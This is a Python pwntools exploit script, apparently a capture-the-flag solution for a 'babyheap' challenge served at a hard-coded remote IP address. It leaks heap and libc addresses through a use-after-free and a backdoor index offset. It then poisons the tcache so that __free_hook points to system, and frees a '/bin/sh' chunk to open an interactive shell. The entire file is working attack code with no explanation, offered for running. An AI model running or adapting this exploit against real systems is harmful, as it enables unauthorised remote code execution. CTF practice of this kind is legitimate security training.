from elftools.construct import lib
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.27.so')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./babyheap')
else:
    io = remote('47.98.229.103',1337)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

def new(size,content):
    io.sendlineafter(b">>>",str(1).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"now the size:",str(size).encode())
    io.sendafter(b"next the content:",content)

def delete(idx):
    io.sendlineafter(b">>>",str(4).encode())
    io.sendlineafter(b"house index:",str(idx).encode())

def show(idx):
    io.sendlineafter(b">>>",str(2).encode())
    io.sendlineafter(b"house index:",str(idx).encode())

def edit(idx,content):
    io.sendlineafter(b">>>",str(3).encode())
    io.sendlineafter(b"house index:",str(idx).encode())
    io.sendafter(b"content",content)

backdoor_num = 0x74737572

new(0x48,b'a' * 0x48)
new(0x98,b'a' * 0x98)
delete(0+backdoor_num)
delete(1+backdoor_num)
show(0)
io.recvuntil(b'\x00'*8)
heap_base = u64(io.recv(8)) - 0x10
success("heap_base -->" + hex(heap_base))
new(0x78, b'b' * 0x78) #idx = 2
# p()

#payload = p64(heap_base + 0x480) + p64(heap_base + 0x10)
# 远端
payload = p64(heap_base + 0x2d0) + p64(heap_base + 0x10)



payload = payload.ljust(0x48,b'\x00')
edit(0,payload)
#p()
new(0x40, b'b' * 0x40) # idx = 3
payload = p64(0) + p64(0x591)
payload = payload.ljust(0x48,b'\x00')
#p()
new(0x48, payload) # idx = 4
#p()
delete(2 + backdoor_num)
show(2)
#p()
libc_base = u64(io.recvuntil(b'\x00\x00')[-8:-2] + b'\x00\x00') - 0x3ebca0
success("libc_base -->" + hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
success("free_hook -->" + hex(free_hook))
#p()

new(0x8,b'/bin/sh\x00') # idx = 5
payload = p64(free_hook) + p64(heap_base + 0x10)
payload = payload.ljust(0x98,b'\x00')
edit(1,payload)
new(0x98,b'c' * 0x98) #idx = 5
payload = p64(libc_base + libc.symbols['system'])
payload = payload.ljust(0x98,b'\x00')
#p()
new(0x98,payload) # idx = 6
#p()
delete(5)

io.interactive()

